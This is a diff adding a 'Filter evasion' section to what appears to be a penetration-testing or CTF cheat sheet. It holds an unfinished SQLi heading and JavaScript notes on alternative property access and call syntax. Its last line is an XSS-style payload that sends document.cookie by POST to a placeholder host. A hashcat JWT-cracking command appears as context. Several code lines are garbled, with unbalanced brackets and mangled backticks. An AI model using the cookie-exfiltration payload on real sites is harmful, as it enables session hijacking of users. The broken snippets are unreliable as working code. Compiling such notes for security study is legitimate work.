@@ -545,6 +545,19 @@ hashcat -a 0 -m 16500 <jwt> <wordlist>
 
 
 ## Various
+### :white_check_mark: Filter evasion
+⚠️ TODO ⚠️
+#### SQLi
+- 
+#### Javascript
+- Accessing object `obj = {p:'A'}`
+  - `obj.p     // 'A'`
+  - `obj['p']  // 'A'`
+  - `const { p } = object; p // 'A'`
+- Function calls `function f(a, b){console.log(a + b}`
+  - f('a','b')
+  - `f\arg1${arg2}arg1${arg2}\` // fetch`https://example.org/data${{mode:'no-cors', method:'POST', body: document.cookie}})
+
 ### :white_check_mark: Work with hash
 #### Identify hash
 Dcode tool to identify hash [here](https://www.dcode.fr/identification-hash).
